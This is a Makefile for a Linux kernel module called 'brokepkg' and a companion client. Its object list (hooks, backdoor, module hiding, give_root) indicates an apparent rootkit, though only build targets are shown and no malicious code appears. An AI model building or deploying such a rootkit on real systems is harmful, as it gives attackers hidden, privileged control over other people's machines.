obj-m := brokepkg.o
brokepkg-objs := src/main.o src/hooks.o src/backdoor.o src/module_hide.o src/give_root.o
SHELL := $(shell command -v bash)
CC := gcc
KDIR := /lib/modules/$(shell uname -r)/build
CLIENT_NAME = brokecli
ccflags-y += -I$(PWD)/include -Wall
PWD := $(shell pwd)
SCRIPTS_DIR ?= $(PWD)/scripts
CONFIG_SCRIPT ?= $(SCRIPTS_DIR)/config.sh
INSTALL_SCRIPT ?= $(SCRIPTS_DIR)/install.sh
DEPENDENCIES_SCRIPT ?= $(SCRIPTS_DIR)/dependencies.sh
CLIENT_DIR := $(PWD)/userland

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

config:
	@ $(SHELL) $(CONFIG_SCRIPT)

install:
	@ $(SHELL) $(INSTALL_SCRIPT)

deps:
	@ $(SHELL) $(DEPENDENCIES_SCRIPT)

clean: client-clean
	$(MAKE) -C $(KDIR) M=$(PWD) clean

client:
	$(MAKE) -C $(CLIENT_DIR) NAME=$(CLIENT_NAME)

client-clean:
	$(MAKE) -C $(CLIENT_DIR) NAME=$(CLIENT_NAME) clean

client-install:
	mv $(CLIENT_DIR)/$(CLIENT_NAME) /usr/bin
